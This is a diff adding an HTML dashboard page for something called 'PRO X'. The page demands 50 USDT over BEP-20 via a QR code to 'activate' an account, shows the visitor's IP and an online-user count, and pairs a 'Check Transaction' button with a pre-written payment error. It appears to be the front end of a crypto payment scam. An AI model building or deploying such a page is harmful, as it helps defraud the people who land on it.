@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="theme-color" content="#e0800b" />
+    <link rel="icon" type="image/x-icon" href="assets/icon.png">
+    <title>PRO X | Dashboard</title>
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body onload="hideLoader()">
+    <div class="loader-container">
+        <div class="loader"></div>
+    </div>
+
+    <div class="users">
+        <div class="green-point"></div>
+        <p><span id="userCount"></span> online users.</p>
+    </div>
+
+    <div class="main">
+        <p id="ip_message"></p>
+        <hr>
+        <br>
+        <p>To activate your account, please pay 50.00 USDT via the provided QR code on the BEP-20 network.</p>
+        <br>
+        <img src="assets/QR-code.png">
+        <br>
+        <br>
+
+        <button id="Btn">Check Transaction</button>
+        <!-- The loading spinner -->
+        <div id="loader2" class="loader2"></div>
+        <!-- The popup message -->
+        <div id="popup" class="popup">
+            <span class="popup-close">&times;</span>
+            <p>Error: Please pay 50.00 USDT before checking the transaction.</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
